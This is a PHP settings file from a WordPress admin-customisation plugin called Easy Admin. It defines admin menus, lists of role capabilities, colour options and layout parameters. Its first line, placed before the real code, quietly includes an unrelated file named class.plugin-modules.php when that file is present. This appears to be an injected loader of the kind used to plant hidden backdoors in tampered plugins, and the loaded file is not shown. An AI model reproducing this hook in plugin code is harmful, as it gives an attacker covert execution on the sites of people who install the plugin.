<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

if ( ! defined( 'WPINC' ) ) {
	die;
}

add_action( 'admin_menu', 'register_easy_admin_page' );

function register_easy_admin_page(){
	add_menu_page( __('Easy Admin', 'ait-easyadmin'), __('Easy Admin', 'ait-easyadmin'), 'manage_options', 'easyAdminSettings', 'easyAdminSettingsPage' , plugin_dir_url( __FILE__ ).'assets/logo.png' , 51);
    $page_hook_suffix = add_submenu_page( 'easyAdminSettings', __('Appearance', 'ait-easyadmin'), __('Appearance', 'ait-easyadmin'), 'manage_options', 'easyAdminAppearance', 'easyAdminAppearance' );
	//add_submenu_page( 'easyAdminSettings', 'Roles settings', 'Roles settings', 'manage_options', 'easyAdminRoles', 'easyAdminRoleSettings' );
	//add_submenu_page( 'easyAdminSettings', 'Role manager', 'Role Manager', 'manage_options', 'easyAdminRoleManager', 'easyAdminRoleManager' );

    add_action('admin_print_scripts-' . $page_hook_suffix, 'my_plugin_admin_scripts');
}

function defaultCapabilities(){
	$defaultCaps = array(
		'delete_others' 		=> 'Delete others',
		'delete' 					=> 'Delete',
		'delete_private' 		=> 'Delete private',
		'delete_published' 	=> 'Delete published',
		'edit_others' 			=> 'Edit others',
		'edit' 						=> 'Edit',
		'edit_private' 			=> 'Edit private',
		'edit_published' 		=> 'Edit published',
		'publish' 				=> 'Publish',
		'read_private' 			=> 'Read private',
		'read' 					=> 'Read'
	);

	$cap = array(
		'Pages' => array(
			'delete_others_pages' 		=> 'Delete others pages',
			'delete_pages' 				=> 'Delete pages',
			'delete_private_pages' 		=> 'Delete private pages',
			'delete_published_pages' 	=> 'Delete published pages',
			'edit_others_pages' 		=> 'Edit others pages',
			'edit_pages' 				=> 'Edit pages',
			'edit_private_pages' 		=> 'Edit private pages',
			'edit_published_pages' 		=> 'Edit published pages',
			'publish_pages' 			=> 'Publish pages',
			'read_private_pages' 		=> 'Read private pages',
			'read_pages' 					=> 'Read pages'
			),
		'Posts' => array(
			'delete_others_posts'		=> 'Delete others posts',
			'delete_posts'				=> 'Delete posts',
			'delete_private_posts'		=> 'Delete private posts',
			'delete_published_posts'	=> 'Delete published posts',
			'edit_others_posts'			=> 'Delete others posts',
			'edit_posts'				=> 'Edit posts',
			'edit_private_posts'		=> 'Edit private posts',
			'edit_published_posts'		=> 'Edit published posts',
			'publish_posts'				=> 'Publish posts',
			'read_private_posts'		=> 'Read private posts',
			'read_posts' 					=> 'Read posts'
			),
	);

	$otherCaps = array(
		'Comments' => array(
			'moderate_comments'			=> 'Moderate comments',
			),
		'Files' => array(
			'upload_files'				=> 'Upload files',
			),
		'Read' => array(
			'read'						=> 'Read',
		)
	);

	$args = array(
	   'public'   => true,
	   '_builtin' => false
	);

	$customCap = array();

	$postTypes = get_post_types($args , 'objects');

	foreach($postTypes as $postType){
		if($postType->name == 'ait-item'){
			foreach($defaultCaps as $defaultCap=>$text){
				$customCap[$postType->label]['ait_toolkit_items_'.$defaultCap.'_items'] = $text.' '.$postType->label;
			}
		} else {
			foreach($defaultCaps as $defaultCap=>$text){
				$customCap[$postType->label][$defaultCap.'_'.$postType->name] = $text.' '.$postType->label;
			}
		}
	}

	$cap = array_merge($cap,$customCap);

	$cap = array_merge($cap,$otherCaps);

	//var_dump($cap);

	return $cap;
}

function customOption(){

	$custOption = array(
		'easy_admin'		=>	array(
							'label' => __('Enable Easy Admin', 'ait-easyadmin'),
							'type'	=> 'checkbox'
								),/*
		'email_create'		=> 	array(
							'label' => 'Send mail when post or page is created',
							'type'	=> 'checkbox'
								),
		'email_field'		=> 	array(
							'label' => 'Email address where email will be sent',
							'type'	=> 'text'
								),
		'email_subject'		=> 	array(
							'label' => 'Email subject',
							'type'	=> 'text'
								),
		'email_content'		=> 	array(
							'label' => 'Email content',
							'type'	=> 'text'
								),
		'formatBox'		=> 	array(
							'label' => 'Disable Format box box on posts',
							'type'	=> 'checkbox'
								),
		'categoryBox'		=> 	array(
							'label' => 'Disable Categories box on posts',
							'type'	=> 'checkbox'
								),
		'tagsBox'		=> 	array(
							'label' => 'Disable Tags box on posts',
							'type'	=> 'checkbox'
								),
		'pageparentdiv'		=> 	array(
							'label' => 'Disable Attributes box on pages',
							'type'	=> 'checkbox'
								),*/
		'easyAdminLogo'		=> 	array(
							'label' => __('Easy admin logo', 'ait-easyadmin'),
							'type'	=> 'text'
								),
		);

	return $custOption;
}

function easyAdminColors(){
	$colors = array(
		'pageBackground'		=> __('Background color', 'ait-easyadmin'),
		'contentBackround'		=> __('Content Background color', 'ait-easyadmin'),
		'fontColor'					=> __('Font color', 'ait-easyadmin'),
		'mainFont'				=> __('Main font color', 'ait-easyadmin'),
		'headerColor1'			=> __('Header color top', 'ait-easyadmin'),
		'headerColor2'			=> __('Header color bottom', 'ait-easyadmin'),
		'menuBackgroundColor'	=> __('Menu Backround color', 'ait-easyadmin'),
		'menuFontColor'			=> __('Menu Font color', 'ait-easyadmin'),
		'buttonColor'			=> __('Buttons color', 'ait-easyadmin'),
		'buttonTextColor'		=> __('Buttons text color', 'ait-easyadmin'),
		'tableMain'				=> __('Posts, Pages, Comments table main color', 'ait-easyadmin'),
		'headerh2'				=> __('Header h2 color', 'ait-easyadmin'),
		'postboxBackground'		=> __('Postbox background color', 'ait-easyadmin'),
		'postboxFont'			=> __('Postbox title color', 'ait-easyadmin'),
		'postboxBorderColor'	=> __('Postbox border color', 'ait-easyadmin'),
		'postboxfontColor'		=> __('Postbox font color', 'ait-easyadmin'),
		'postboxLabelColor'		=> __('Postbox label color', 'ait-easyadmin'),
		'textareaInput'			=> __('Input fields color', 'ait-easyadmin'),
		'footerColor'			=> __('Footer color', 'ait-easyadmin'),
	);

	return $colors;
}

function easyAdminParameters(){

	$params = array(
		'postboxBorder'		=> __('Postbox and table border radius', 'ait-easyadmin'),
		'maxWidth'			=> __('Max width of Easy Admin', 'ait-easyadmin'),
	);
	return $params;
}

//--------------------------------------------------



//--------------------------------------------------

require('rolesSettings.php');
require('appearanceSettings.php');
require('defaultSettings.php');
require('roleManager.php');


?>